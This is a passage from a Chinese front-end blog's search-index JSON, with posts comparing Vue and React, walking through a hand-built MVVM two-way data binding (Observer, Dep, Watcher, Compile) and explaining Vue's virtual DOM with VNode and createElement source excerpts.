DOM，\n当然，不得不说，vue的虚拟DOM一定是从react这里模仿的，但是好的东西就是需要被模仿的，而没有必要重复的造轮子，所以没毛病。使用虚拟DOM的好处就很多了，比如通过虚拟DOM结合diff算法，我们可以很好地解决DOM操作的性能问题，即生成虚拟DOM的时间+diff算法时间+patch时间&lt;修改DOM省下来的时间，当然，如果某一天DOM操作很快，那么就不存在这个问题了。react可能就会被其他框架取代了。另外，使用虚拟DOM，可以使得JavaScript的应用不仅仅局限于网页，还可以是ios、安卓等，因为在react中没有用到html，用到的时jsx，虚拟dom，最后生成的可以是用在网页上的html，也可以是用在安卓和ios的控件，所以，react-native的大火也就可想而知了。、\n2、都提供了响应式（Reactive）和组件化（Composable）的视图组件。\nreact和vue中的组件都是核心，是整个框架的灵魂，之前我们使用的都是以页面为基本单位的，但是却不知道组件的好处。\n首先通过组件化以后，这个组件就是可复用的了，比如如果使用传统方式写一个网站，如果标题和结尾都是一样的，那我们可能会不断的复制、粘贴，但是呢，如果使用了组件化的思想，只需要写好组件，然后在需要的地方插入组件即可。\n又比如vue中的单文件组件，我们写一个组件，就知道是什么含义，并且css和js都可以写在一个文件里，css通过属性scoped可以防止css的类名污染。而对于template也可以放心的使用，不用担心重复的问题。\n基于react的UI库ant.design，我们还可以直接调用这些组件，大大地加快了前端开发的速度和效率，所以，组件的使用，绝对是前端的一小步，历史的一大步。\n3、都将注意力集中保持在核心库，而将其他功能如路由和全局状态管理交给相关的库。\n即vue和react都是专注于视图的框架，只是在局部区域，vue提供了双向数据绑定，这样更有利于我们处理表单等问题，而react在这方面就有了一定的劣势。。\n而如果希望做大型的项目，对于vue来说，就可以使用vue-router，来构建大型网站的路由；状态复杂，不好管了，我们就使用vuex；所以，这也就是官网所说的渐进式的框架了。同样的，react也是可以直接使用的，包括react-router和redux，方便我们构建大型应用。只是前者的周边库是由尤雨溪维护，后者是由react庞大的社区维护的。\n4、vue比react更容易上手。\n这一点是毋庸置疑的，为什么这么说呢？因为对于vue，无论你是使用webpack还是broserify，vue-cli都可以很好地满足你的开发任务。\n学习vue，我们只需要掌握中级的html、css、js即可，在head中引入一个vue.js库，就可以直接使用了。并且对于数据双向绑定、指定等都可以很好地体现。\n但是react的学习会更加复杂一些，react需要有ES6的基础，因为react组件的创建多是使用es6的class来创建的，所以会更加麻烦一些，并且对于JSX语法，还是有一定的学习成本的。\n因此我们说vue更容易上手。\n5、性能都很好。\nvue和react都采用了虚拟DOM的方式，所以在性能方面是非常地接近的，这个无需多说，\n6、vue的优化做的要比react好一些。\n在React应用中，当某个组件的状态发生变化时，它会以该组件为根，重新渲染整个组件子树。如要避免不必要的子组件的重渲染，你需要在所有可能的地方使用PureComponent，或是手动实现shouldComponentUpdate方法。同时你可能会需要使用不可变的数据结构来使得你的组件更容易被优化。然而，使用PureComponent和shouldComponentUpdate时，需要保证该组件的整个子树的渲染输出都是由该组件的props所决定的。如果不符合这个情况，那么此类优化就会导致难以察觉的渲染结果不一致。这使得React中的组件优化伴随着相当的心智负担。\n而在做vue相关的项目时，我们只需要关注于业务逻辑，而不需要去操心是否会产生不必要的组件渲染，因为vue已经把这些麻烦的东西很好的解决了。\n7、vue和react同样都支持本地渲染。\nReact Native能使你用相同的组件模型编写有本地渲染能力的APP（iOS和Android）。能同时跨多平台开发，对开发者是非常棒的。相应地，Vue和Weex会进行官方合作，Weex是阿里的跨平台用户界面开发框架，Weex的JavaScript框架运行时用的就是Vue。这意味着在Weex的帮助下，你使用Vue语法开发的组件不仅仅可以运行在浏览器端，还能被用于开发iOS和Android上的原生应用。\n一句话：你写的组件不仅可以跑在浏览器的网页上，也可以泡在安卓和ios的app里。\n8、react更为繁荣。\nreact社区还是非常繁荣的，所以在知名度方面react也是更胜一筹，使用react和react-native的开发人员还是很多的，这也是vue需要学习和进步的地方。\n9、vue写起来更加流畅、方便，react语法更简单、扩展更强大。\n在这一方面，react和vue的出发点似乎是不一样的，但是我还是比较喜欢vue的写法。比如，对于列表循环，使用vue，直接在标签上写v-for即可，然后就可以直接循环了，而react需要通过一个数组的map，然后在return，在形式上来说，vue的写法还是更加舒服一点。另外，由于vue局部的数据双向绑定，所以vue在处理表单这一块也是游刃有余，非常方便，而react仅仅是处理一个表单，就需要添加很多无关的代码，这个还是非常别扭的。\n可以看得出来，vue提供了更多的api，可以做更多的事情，但是，这也体现了react的优点，即非常简单，提供的api很少，它只帮我们做了虚拟DOM的工作，其他的事情可以让我们自由的发挥，所以从这个角度来说，react还是更加简单一些的。\n10、vue的文档更加好。\n虽然react也有中文文档，但是vue的文档更新的更频繁，并且写的很好，我们可以很容易地学习。毕竟大佬是中国的，还是很不错的，推荐初学者学习、使用。\n11、无论是vue还是react我们都不需要触碰DOM。\n就这两者而言，我们都关心虚拟DOM，而不用去触碰DOM，这些都是vue帮助我们处理好的了。因为dom的操作是费时的，所以通过vue，我们可以很好地解决这些问题，尽可能少的减少DOM。一般来说，对于一个项目，我们使用了vue或者是react，jquery基本上就是不需要的了。如果真的需要，看看到底哪里做的不对\n12、vue对于事件的清除优于react。\n在vue中，事件绑定之后，可以在组件销毁的同时事件接触绑定，无需我们自己去手动清除；而react却不是这样的，react需要我们在componentDidMount的时候绑定，在componentWillUnMount的时候接触绑定，否则会出现问题，尤其是添加在document上面的事件。\n","categories":["框架"],"tags":["vue","react"]},{"title":"mvvm模式原理","url":"/2018/09/18/Vue/%E5%AE%9E%E7%8E%B0%E6%95%B0%E6%8D%AE%E7%9A%84%E5%8F%8C%E5%90%91%E7%BB%91%E5%AE%9Amvvm-%E5%89%96%E6%9E%90Vue%E7%9A%84%E5%8E%9F%E7%90%86/","content":"Vue代码\n&lt;div id=&quot;mvvm-app&quot;&gt;    &lt;input type=&quot;text&quot; v-model=&quot;word&quot;&gt;    &lt;p&gt;&#123;&#123;word&#125;&#125;&lt;/p&gt;    &lt;button v-on:click=&quot;sayHi&quot;&gt;change model&lt;/button&gt;&lt;/div&gt;&lt;script src=&quot;observer.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;watcher.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;compile.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;mvvm.js&quot;&gt;&lt;/script&gt;&lt;script&gt;var vm = new MVVM(&#123;    el: &#x27;#mvvm-app&#x27;,    data: &#123;        word: &#x27;Hello World!&#x27;    &#125;,    methods: &#123;        sayHi: function() &#123;            this.word = &#x27;Hi, everybody!&#x27;;        &#125;    &#125;    &#125;);&lt;/script&gt;\n\n\n\n总结在 newVue() 后， Vue 会调用 _init 函数进行初始化，也就是init 过程，在 这个过程Data通过Observer转换成了getter&#x2F;setter的形式，来对数据追踪变化，当被设置的对象被读取的时候会执行 getter 函数，而在当被赋值的时候会执行 setter函数。当render function 执行的时候，因为会读取所需对象的值，所以会触发getter函数从而将Watcher添加到依赖中进行依赖收集。在修改对象的值的时候，会触发对应的 setter， setter通知之前依赖收集得到的 Dep 中的每一个 Watcher，告诉它们自己的值改变了，需要重新渲染视图。这时候这些 Watcher就会开始调用 update 来更新视图。\n一、几种实现双向绑定的做法\n目前几种主流的mvc(vm)框架都实现了单向数据绑定，而我所理解的双向数据绑定无非就是在单向绑定的基础上给可输入元素（input、textare等）添加了change(input)事件，来动态修改model和 view，并没有多高深。所以无需太过介怀是实现的单向或双向绑定。\n\n\n发布者-订阅者模式（backbone.js）\n\n脏值检查（angular.js）\n\n数据劫持（vue.js）\n1.1 发布者-订阅者模式\n一般通过sub, pub的方式实现数据和视图的绑定监听，更新数据方式通常做法是 vm.set(&#39;property&#39;, value)，这里有篇文章讲的比较详细\n这种方式现在毕竟太low了，我们更希望通过 vm.property = value这种方式更新数据，同时自动更新视图，于是有了下面两种方式\n\n1.2 脏值检查\nangular.js 是通过脏值检测的方式比对数据是否有变更，来决定是否更新视图，最简单的方式就是通过 setInterval() 定时轮询检测数据变动，当然Google不会这么low，angular只有在指定的事件触发时进入脏值检测，大致如下：\n\n\nDOM事件，譬如用户输入文本，点击按钮等。( ng-click )\nXHR响应事件 ( $http )\n浏览器Location变更事件 ( $location )\nTimer事件( $timeout , $interval )\n执行 $digest() 或 $apply()\n\n1.3 数据劫持\nvue.js则是采用数据劫持结合发布者-订阅者模式的方式，通过Object.defineProperty()来劫持各个属性的setter，getter，在数据变动时发布消息给订阅者，触发相应的监听回调。\n\n\n\n二、实现思路\n已经了解到vue是通过数据劫持的方式来做数据绑定的，其中最核心的方法便是通过Object.defineProperty()来实现对属性的劫持，达到监听数据变动的目的，无疑这个方法是本文中最重要、最基础的内容之一，如果不熟悉defineProperty，猛戳这里\n\n要实现mvvm的双向绑定，就必须要实现以下几点\n\n实现一个数据监听器Observer，能够对数据对象的所有属性进行监听，如有变动可拿到最新值并通知订阅者\n实现一个指令解析器Compile，对每个元素节点的指令进行扫描和解析，根据指令模板替换数据，以及绑定相应的更新函数\n实现一个Watcher，作为连接Observer和Compile的桥梁，能够订阅并收到每个属性变动的通知，执行指令绑定的相应回调函数，从而更新视图\nmvvm入口函数，整合以上三者\n\n2.1 实现Observer\n我们知道可以利用Obeject.defineProperty()来监听属性变动\n那么将需要observe的数据对象进行递归遍历，包括子属性对象的属性，都加上setter和getter\n这样的话，给这个对象的某个值赋值，就会触发setter，那么就能监听到了数据变化。相关代码可以是这样\n\nvar data = &#123;name: &#x27;kindeng&#x27;&#125;;observe(data);data.name = &#x27;dmq&#x27;; // 哈哈哈，监听到值变化了 kindeng --&gt; dmqfunction observe(data) &#123;    if (!data || typeof data !== &#x27;object&#x27;) &#123;        return;    &#125;    // 取出所有属性遍历    Object.keys(data).forEach(function(key) &#123;\t    defineReactive(data, key, data[key]);\t&#125;);&#125;;function defineReactive(data, key, val) &#123;    observe(val); // 监听子属性    Object.defineProperty(data, key, &#123;        enumerable: true, // 可枚举        configurable: false, // 不能再define        get: function() &#123;            return val;        &#125;,        set: function(newVal) &#123;            console.log(&#x27;哈哈哈，监听到值变化了 &#x27;, val, &#x27; --&gt; &#x27;, newVal);            val = newVal;        &#125;    &#125;);&#125;\n\n\n完整代码 https://github.com/poetries/mvvm/blob/master/observer.js\n\n\n这样我们已经可以监听每个数据的变化了，那么监听到变化之后就是怎么通知订阅者了，所以接下来我们需要实现一个消息订阅器，很简单，维护一个数组，用来收集订阅者，数据变动触发notify，再调用订阅者的update方法，代码改善之后是这样\n\n// ... 省略function defineReactive(data, key, val) &#123;\tvar dep = new Dep();    observe(val); // 监听子属性    Object.defineProperty(data, key, &#123;        // ... 省略        set: function(newVal) &#123;        \tif (val === newVal) return;            console.log(&#x27;哈哈哈，监听到值变化了 &#x27;, val, &#x27; --&gt; &#x27;, newVal);            val = newVal;            dep.notify(); // 通知所有订阅者        &#125;    &#125;);&#125;function Dep() &#123;    this.subs = [];&#125;Dep.prototype = &#123;    addSub: function(sub) &#123;        this.subs.push(sub);    &#125;,    notify: function() &#123;        this.subs.forEach(function(sub) &#123;            sub.update();        &#125;);    &#125;&#125;;\n\n\n那么问题来了，谁是订阅者，怎么往订阅器添加订阅者？\n没错，上面的思路整理中我们已经明确订阅者应该是Watcher, 而且var dep = new Dep();是在 defineReactive方法内部定义的，所以想通过dep添加订阅者，就必须要在闭包内操作，所以我们可以在getter里面动手脚：\n\n// Observer.js// ...省略Object.defineProperty(data, key, &#123;\tget: function() &#123;\t\t// 由于需要在闭包内添加watcher，所以通过Dep定义一个全局target属性，暂存watcher, 添加完移除\t\tDep.target &amp;&amp; dep.addDep(Dep.target);\t\treturn val;\t&#125;    // ... 省略&#125;);// Watcher.jsWatcher.prototype = &#123;\tget: function(key) &#123;\t\tDep.target = this;\t\tthis.value = data[key];\t// 这里会触发属性的getter，从而添加订阅者\t\tDep.target = null;\t&#125;&#125;\n\n\n这里已经实现了一个Observer了，已经具备了监听数据和数据变化通知订阅者的功能。那么接下来就是实现Compile了\n\n2.2 实现Compile\ncompile主要做的事情是解析模板指令，将模板中的变量替换成数据，然后初始化渲染页面视图\n并将每个指令对应的节点绑定更新函数，添加监听数据的订阅者，一旦数据有变动，收到通知，更新视图，如图所示\n\n\n\n因为遍历解析的过程有多次操作dom节点，为提高性能和效率，会先将跟节点el转换成文档碎片fragment进行解析编译操作\n解析完成，再将fragment添加回原来的真实dom节点中\n\nfunction Compile(el) &#123;    this.$el = this.isElementNode(el) ? el : document.querySelector(el);    if (this.$el) &#123;        this.$fragment = this.node2Fragment(this.$el);        this.init();        this.$el.appendChild(this.$fragment);    &#125;&#125;Compile.prototype = &#123;\tinit: function() &#123; this.compileElement(this.$fragment); &#125;,    node2Fragment: function(el) &#123;        var fragment = document.createDocumentFragment(), child;        // 将原生节点拷贝到fragment        while (child = el.firstChild) &#123;            fragment.appendChild(child);        &#125;        return fragment;    &#125;&#125;;\n\n\ncompileElement方法将遍历所有节点及其子节点，进行扫描解析编译，调用对应的指令渲染函数进行数据渲染，并调用对应的指令更新函数进行绑定，详看代码及注释说明\n\nCompile.prototype = &#123;\t// ... 省略\tcompileElement: function(el) &#123;        var childNodes = el.childNodes, me = this;        [].slice.call(childNodes).forEach(function(node) &#123;            var text = node.textContent;            var reg = /\\&#123;\\&#123;(.*)\\&#125;\\&#125;/;\t// 表达式文本            // 按元素节点方式编译            if (me.isElementNode(node)) &#123;                me.compile(node);            &#125; else if (me.isTextNode(node) &amp;&amp; reg.test(text)) &#123;                me.compileText(node, RegExp.$1);            &#125;            // 遍历编译子节点            if (node.childNodes &amp;&amp; node.childNodes.length) &#123;                me.compileElement(node);            &#125;        &#125;);    &#125;,    compile: function(node) &#123;        var nodeAttrs = node.attributes, me = this;        [].slice.call(nodeAttrs).forEach(function(attr) &#123;            // 规定：指令以 v-xxx 命名            // 如 &lt;span v-text=&quot;content&quot;&gt;&lt;/span&gt; 中指令为 v-text            var attrName = attr.name;\t// v-text            if (me.isDirective(attrName)) &#123;                var exp = attr.value; // content                var dir = attrName.substring(2);\t// text                if (me.isEventDirective(dir)) &#123;                \t// 事件指令, 如 v-on:click                    compileUtil.eventHandler(node, me.$vm, exp, dir);                &#125; else &#123;                \t// 普通指令                    compileUtil[dir] &amp;&amp; compileUtil[dir](node, me.$vm, exp);                &#125;            &#125;        &#125;);    &#125;&#125;;// 指令处理集合var compileUtil = &#123;    text: function(node, vm, exp) &#123;        this.bind(node, vm, exp, &#x27;text&#x27;);    &#125;,    // ...省略    bind: function(node, vm, exp, dir) &#123;        var updaterFn = updater[dir + &#x27;Updater&#x27;];        // 第一次初始化视图        updaterFn &amp;&amp; updaterFn(node, vm[exp]);        // 实例化订阅者，此操作会在对应的属性消息订阅器中添加了该订阅者watcher        new Watcher(vm, exp, function(value, oldValue) &#123;        \t// 一旦属性值有变化，会收到通知执行此更新函数，更新视图            updaterFn &amp;&amp; updaterFn(node, value, oldValue);        &#125;);    &#125;&#125;;// 更新函数var updater = &#123;    textUpdater: function(node, value) &#123;        node.textContent = typeof value == &#x27;undefined&#x27; ? &#x27;&#x27; : value;    &#125;    // ...省略&#125;;\n\n\n完整代码 https://github.com/poetries/mvvm/blob/master/compile.js\n\n\n这里通过递归遍历保证了每个节点及子节点都会解析编译到\n指令的声明规定是通过特定前缀的节点属性来标记，如中v-text&#96;便是指令\n监听数据、绑定更新函数的处理是在compileUtil.bind()这个方法中，通过new Watcher()添加回调来接收数据变化的通知\n至此，一个简单的Compile就完成了。接下来要看看Watcher这个订阅者的具体实现了\n\n2.3 实现Watcher\nWatcher订阅者作为Observer和Compile之间通信的桥梁，主要做的事情是\n\n\n在自身实例化时往属性订阅器dep里面添加自己\n自身必须有一个update()方法\n待属性变动dep.notice()通知时，能调用自身的update()方法，并触发Compile中绑定的回调，则功成身退。\n\nfunction Watcher(vm, exp, cb) &#123;    this.cb = cb;    this.vm = vm;    this.exp = exp;    // 此处为了触发属性的getter，从而在dep添加自己，结合Observer更易理解    this.value = this.get(); &#125;Watcher.prototype = &#123;    update: function() &#123;        this.run();\t// 属性值变化收到通知    &#125;,    run: function() &#123;        var value = this.get(); // 取到最新值        var oldVal = this.value;        if (value !== oldVal) &#123;            this.value = value;            this.cb.call(this.vm, value, oldVal); // 执行Compile中绑定的回调，更新视图        &#125;    &#125;,    get: function() &#123;        Dep.target = this;\t// 将当前订阅者指向自己        var value = this.vm[exp];\t// 触发getter，添加自己到属性订阅器中        Dep.target = null;\t// 添加完毕，重置        return value;    &#125;&#125;;// 这里再次列出Observer和Dep，方便理解Object.defineProperty(data, key, &#123;\tget: function() &#123;\t\t// 由于需要在闭包内添加watcher，所以可以在Dep定义一个全局target属性，暂存watcher, 添加完移除\t\tDep.target &amp;&amp; dep.addDep(Dep.target);\t\treturn val;\t&#125;    // ... 省略&#125;);Dep.prototype = &#123;    notify: function() &#123;        this.subs.forEach(function(sub) &#123;            sub.update(); // 调用订阅者的update方法，通知变化        &#125;);    &#125;&#125;;\n\n\n完整代码 https://github.com/poetries/mvvm/blob/master/watcher.js\n\n\n实例化Watcher的时候，调用get()方法，通过Dep.target = watcherInstance标记订阅者是当前watcher实例，强行触发属性定义的getter方法，getter方法执行的时候，就会在属性的订阅器dep添加当前watcher实例，从而在属性值有变化的时候，watcherInstance就能收到更新通知。\n基本上vue中数据绑定相关比较核心的几个模块也是这几个，猛戳这里 , 在src 目录可找到vue源码。\n\n\n最后来讲讲MVVM入口文件的相关逻辑和实现吧，相对就比较简单了\n\n三、实现MVVM\nMVVM作为数据绑定的入口，整合Observer、Compile和Watcher三者，通过Observer来监听自己的model数据变化，通过Compile来解析编译模板指令，最终利用Watcher搭起Observer和Compile之间的通信桥梁，达到数据变化 -&gt; 视图更新；视图交互变化(input) -&gt; 数据model变更的双向绑定效果。\n\n\n一个简单的MVVM构造器是这样子：\n\nfunction MVVM(options) &#123;    this.$options = options;    var data = this._data = this.$options.data;    observe(data, this);    this.$compile = new Compile(options.el || document.body, this)&#125;\n\n\n但是这里有个问题，从代码中可看出监听的数据对象是options.data，每次需要更新视图，则必须通过var vm = new MVVM(&#123;data:&#123;name: &#39;kindeng&#39;&#125;&#125;); vm._data.name = &#39;dmq&#39;;这样的方式来改变数据。\n显然不符合我们一开始的期望，我们所期望的调用方式应该是这样的：var vm = new MVVM(&#123;data: &#123;name: &#39;kindeng&#39;&#125;&#125;); vm.name = &#39;dmq&#39;;\n所以这里需要给MVVM实例添加一个属性代理的方法，使访问vm的属性代理为访问vm._data的属性，改造后的代码如下：\n\nfunction MVVM(options) &#123;    this.$options = options;    var data = this._data = this.$options.data, me = this;    // 属性代理，实现 vm.xxx -&gt; vm._data.xxx    Object.keys(data).forEach(function(key) &#123;        me._proxy(key);    &#125;);    observe(data, this);    this.$compile = new Compile(options.el || document.body, this)&#125;MVVM.prototype = &#123;\t_proxy: function(key) &#123;\t\tvar me = this;        Object.defineProperty(me, key, &#123;            configurable: false,            enumerable: true,            get: function proxyGetter() &#123;                return me._data[key];            &#125;,            set: function proxySetter(newVal) &#123;                me._data[key] = newVal;            &#125;        &#125;);\t&#125;&#125;\n\n完整代码 https://github.com/poetries/mvvm/blob/master/mvvm.js\n\n这里主要还是利用了Object.defineProperty()这个方法来劫持了vm实例对象的属性的读写权，使读写vm实例的属性转成读写了vm._data的属性值，达到鱼目混珠的效果\n\n","categories":["架构模式","框架"],"tags":["vue"]},{"title":"vue-虚拟DOM","url":"/2018/09/21/Vue/%E8%99%9A%E6%8B%9Fdom/","content":"一、什么是虚拟DOM虚拟 DOM （Virtual DOM ）这个概念相信大家都不陌生，从 React 到 Vue ，虚拟 DOM 为这两个框架都带来了跨平台的能力（React-Native 和 Weex）\n实际上它只是一层对真实DOM的抽象，以JavaScript 对象 (VNode 节点) 作为基础的树，用对象的属性来描述节点，最终可以通过一系列操作使这棵树映射到真实环境上\n在Javascript对象中，虚拟DOM 表现为一个 Object对象。并且最少包含标签名 (tag)、属性 (attrs) 和子元素对象 (children) 三个属性，不同框架对这三个属性的名命可能会有差别\n创建虚拟DOM就是为了更好将虚拟的节点渲染到页面视图中，所以虚拟DOM对象的节点与真实DOM的属性一一照应\n在vue中同样使用到了虚拟DOM技术\n定义真实DOM\n&lt;div id=&quot;app&quot;&gt;    &lt;p class=&quot;p&quot;&gt;节点内容&lt;/p&gt;    &lt;h3&gt;&#123;&#123; foo &#125;&#125;&lt;/h3&gt;&lt;/div&gt;\n\n实例化vue\nconst app = new Vue(&#123;    el:&quot;#app&quot;,    data:&#123;        foo:&quot;foo&quot;    &#125;&#125;)\n\n观察render的render，我们能得到虚拟DOM\n(function anonymous() &#123;\twith(this)&#123;return _c(&#x27;div&#x27;,&#123;attrs:&#123;&quot;id&quot;:&quot;app&quot;&#125;&#125;,[_c(&#x27;p&#x27;,&#123;staticClass:&quot;p&quot;&#125;,\t\t\t\t\t  [_v(&quot;节点内容&quot;)]),_v(&quot; &quot;),_c(&#x27;h3&#x27;,[_v(_s(foo))])])&#125;&#125;)\n\n通过VNode，vue可以对这颗抽象树进行创建节点,删除节点以及修改节点的操作， 经过diff算法得出一些需要修改的最小单位,再更新视图，减少了dom操作，提高了性能\n二、为什么需要虚拟DOMDOM是很慢的，其元素非常庞大，页面的性能问题，大部分都是由DOM操作引起的\n真实的DOM节点，哪怕一个最简单的div也包含着很多属性，可以打印出来直观感受一下： \n由此可见，操作DOM的代价仍旧是昂贵的，频繁操作还是会出现页面卡顿，影响用户的体验\n举个例子：\n你用传统的原生api或jQuery去操作DOM时，浏览器会从构建DOM树开始从头到尾执行一遍流程\n当你在一次操作时，需要更新10个DOM节点，浏览器没这么智能，收到第一个更新DOM请求后，并不知道后续还有9次更新操作，因此会马上执行流程，最终执行10次流程\n而通过VNode，同样更新10个DOM节点，虚拟DOM不会立即操作DOM，而是将这10次更新的diff内容保存到本地的一个js对象中，最终将这个js对象一次性attach到DOM树上，避免大量的无谓计算\n\n很多人认为虚拟 DOM 最大的优势是 diff 算法，减少 JavaScript 操作真实 DOM 的带来的性能消耗。虽然这一个虚拟 DOM 带来的一个优势，但并不是全部。虚拟 DOM 最大的优势在于抽象了原本的渲染过程，实现了跨平台的能力，而不仅仅局限于浏览器的 DOM，可以是安卓和 IOS 的原生组件，可以是近期很火热的小程序，也可以是各种GUI\n\n三、如何实现虚拟DOM首先可以看看vue中VNode的结构\n源码位置：src&#x2F;core&#x2F;vdom&#x2F;vnode.js\nexport default class VNode &#123;  tag: string | void;  data: VNodeData | void;  children: ?Array&lt;VNode&gt;;  text: string | void;  elm: Node | void;  ns: string | void;  context: Component | void; // rendered in this component&#x27;s scope  functionalContext: Component | void; // only for functional component root nodes  key: string | number | void;  componentOptions: VNodeComponentOptions | void;  componentInstance: Component | void; // component instance  parent: VNode | void; // component placeholder node  raw: boolean; // contains raw HTML? (server only)  isStatic: boolean; // hoisted static node  isRootInsert: boolean; // necessary for enter transition check  isComment: boolean; // empty comment placeholder?  isCloned: boolean; // is a cloned node?  isOnce: boolean; // is a v-once node?  constructor (    tag?: string,    data?: VNodeData,    children?: ?Array&lt;VNode&gt;,    text?: string,    elm?: Node,    context?: Component,    componentOptions?: VNodeComponentOptions  ) &#123;    /*当前节点的标签名*/    this.tag = tag    /*当前节点对应的对象，包含了具体的一些数据信息，是一个VNodeData类型，可以参考VNodeData类型中的数据信息*/    this.data = data    /*当前节点的子节点，是一个数组*/    this.children = children    /*当前节点的文本*/    this.text = text    /*当前虚拟节点对应的真实dom节点*/    this.elm = elm    /*当前节点的名字空间*/    this.ns = undefined    /*编译作用域*/    this.context = context    /*函数化组件作用域*/    this.functionalContext = undefined    /*节点的key属性，被当作节点的标志，用以优化*/    this.key = data &amp;&amp; data.key    /*组件的option选项*/    this.componentOptions = componentOptions    /*当前节点对应的组件的实例*/    this.componentInstance = undefined    /*当前节点的父节点*/    this.parent = undefined    /*简而言之就是是否为原生HTML或只是普通文本，innerHTML的时候为true，textContent的时候为false*/    this.raw = false    /*静态节点标志*/    this.isStatic = false    /*是否作为跟节点插入*/    this.isRootInsert = true    /*是否为注释节点*/    this.isComment = false    /*是否为克隆节点*/    this.isCloned = false    /*是否有v-once指令*/    this.isOnce = false  &#125;  // DEPRECATED: alias for componentInstance for backwards compat.  /* istanbul ignore next https://github.com/answershuto/learnVue*/  get child (): Component | void &#123;    return this.componentInstance  &#125;&#125;\n\n这里对VNode进行稍微的说明：\n\n所有对象的 context 选项都指向了 Vue 实例\nelm 属性则指向了其相对应的真实 DOM 节点\n\nvue`是通过`createElement`生成`VNode\n\n源码位置：src&#x2F;core&#x2F;vdom&#x2F;create-element.js\nexport function createElement (  context: Component,  tag: any,  data: any,  children: any,  normalizationType: any,  alwaysNormalize: boolean): VNode | Array&lt;VNode&gt; &#123;  if (Array.isArray(data) || isPrimitive(data)) &#123;    normalizationType = children    children = data    data = undefined  &#125;  if (isTrue(alwaysNormalize)) &#123;    normalizationType = ALWAYS_NORMALIZE  &#125;  return _createElement(context, tag, data, children, normalizationType)&#125;\n\n上面可以看到createElement 方法实际上是对 _createElement 方法的封装，对参数的传入进行了判断\nexport function _createElement(    context: Component,    tag?: string | Class&lt;Component&gt; | Function | Object,    data?: VNodeData,    children?: any,    normalizationType?: number): VNode | Array&lt;VNode&gt; &#123;    if (isDef(data) &amp;&amp; isDef((data: any).__ob__)) &#123;        process.env.NODE_ENV !== &#x27;production&#x27; &amp;&amp; warn(            `Avoid using observed data object as vnode data: $&#123;JSON.stringify(data)&#125;\\n` +            &#x27;Always create fresh vnode data objects in each render!&#x27;,            context`        )        return createEmptyVNode()    &#125;    // object syntax in v-bind    if (isDef(data) &amp;&amp; isDef(data.is)) &#123;        tag = data.is    &#125;    if (!tag) &#123;        // in case of component :is set to falsy value        return createEmptyVNode()    &#125;    ...     // support single function children as default scoped slot    if (Array.isArray(children) &amp;&amp;        typeof children[0] === &#x27;function&#x27;    ) &#123;        data = data || &#123;&#125;        data.scopedSlots = &#123; default: children[0] &#125;        children.length = 0    &#125;    if (normalizationType === ALWAYS_NORMALIZE) &#123;        children = normalizeChildren(children)    &#125; else if ( === SIMPLE_NORMALIZE) &#123;        children = simpleNormalizeChildren(children)    &#125;\t// 创建VNode    ...&#125;\n\n可以看到_createElement接收5个参数：\n\ncontext 表示 VNode 的上下文环境，是 Component 类型\ntag 表示标签，它可以是一个字符串，也可以是一个 Component\ndata 表示 VNode 的数据，它是一个 VNodeData 类型\nchildren 表示当前 VNode的子节点，它是任意类型的\nnormalizationType 表示子节点规范的类型，类型不同规范的方法也就不一样，主要是参考 render函数是编译生成的还是用户手写的\n\n根据normalizationType 的类型，children会有不同的定义\nif (normalizationType === ALWAYS_NORMALIZE) &#123;    children = normalizeChildren(children)&#125; else if ( === SIMPLE_NORMALIZE) &#123;    children = simpleNormalizeChildren(children)&#125;\n\nsimpleNormalizeChildren方法调用场景是 render 函数是编译生成的\nnormalizeChildren方法调用场景分为下面两种：\n\nrender 函数是用户手写的\n编译 slot、v-for 的时候会产生嵌套数组\n\n无论是simpleNormalizeChildren还是normalizeChildren都是对children进行规范（使children 变成了一个类型为 VNode 的 Array），这里就不展开说了\n规范化children的源码位置在：src&#x2F;core&#x2F;vdom&#x2F;helpers&#x2F;normalzie-children.js\n在规范化children后，就去创建VNode\nlet vnode, ns// 对tag进行判断if (typeof tag === &#x27;string&#x27;) &#123;  let Ctor  ns = (context.$vnode &amp;&amp; context.$vnode.ns) || config.getTagNamespace(tag)  if (config.isReservedTag(tag)) &#123;    // 如果是内置的节点，则直接创建一个普通VNode    vnode = new VNode(      config.parsePlatformTagName(tag), data, children,      undefined, undefined, context    )  &#125; else if (isDef(Ctor = resolveAsset(context.$options, &#x27;components&#x27;, tag))) &#123;    // component    // 如果是component类型，则会通过createComponent创建VNode节点    vnode = createComponent(Ctor, data, context, children, tag)  &#125; else &#123;    vnode = new VNode(      tag, data, children,      undefined, undefined, context    )  &#125;&#125; else &#123;  // direct component options / constructor  vnode = createComponent(tag, data, context, children)&#125;\n\ncreateComponent`同样是创建`VNode\n\n源码位置：src&#x2F;core&#x2F;vdom&#x2F;create-component.js\nexport function createComponent (  Ctor: Class&lt;Component&gt; | Function | Object | void,  data: ?VNodeData,  context: Component,  children: ?Array&lt;VNode&gt;,  tag?: string): VNode | Array&lt;VNode&gt; | void &#123;  if (isUndef(Ctor)) &#123;    return  &#125; // 构建子类构造函数   const baseCtor = context.$options._base  // plain options object: turn it into a constructor  if (isObject(Ctor)) &#123;    Ctor = baseCtor.extend(Ctor)  &#125;  // if at this stage it&#x27;s not a constructor or an async component factory,  // reject.  if (typeof Ctor !== &#x27;function&#x27;) &#123;    if (process.env.NODE_ENV !== &#x27;production&#x27;) &#123;      warn(`Invalid Component definition: $&#123;String(Ctor)&#125;`, context)    &#125;    return  &#125;  // async component  let asyncFactory  if (isUndef(Ctor.cid)) &#123;    asyncFactory = Ctor    Ctor = resolveAsyncComponent(asyncFactory, baseCtor, context)    if (Ctor === undefined) &#123;      return createAsyncPlaceholder(        asyncFactory,        data,        context,        children,        tag      )    &#125;  &#125;  data = data || &#123;&#125;  // resolve constructor options in case global mixins are applied after  // component constructor creation  resolveConstructorOptions(Ctor)  // transform component v-model data into props &amp; events  if (isDef(data.model)) &#123;    transformModel(Ctor.options, data)  &#125;  // extract props  const propsData = extractPropsFromVNodeData(data, Ctor, tag)  // functional component  if (isTrue(Ctor.options.functional)) &#123;    return createFunctionalComponent(Ctor, propsData, data, context, children)  &#125;  // extract listeners, since these needs to be treated as  // child component listeners instead of DOM listeners  const listeners = data.on  // replace with listeners with .native modifier  // so it gets processed during parent component patch.  data.on = data.nativeOn  if (isTrue(Ctor.options.abstract)) &#123;    const slot = data.slot    data = &#123;&#125;    if (slot) &#123;      data.slot = slot    &#125;  &#125;  // 安装组件钩子函数，把钩子函数合并到data.hook中  installComponentHooks(data)  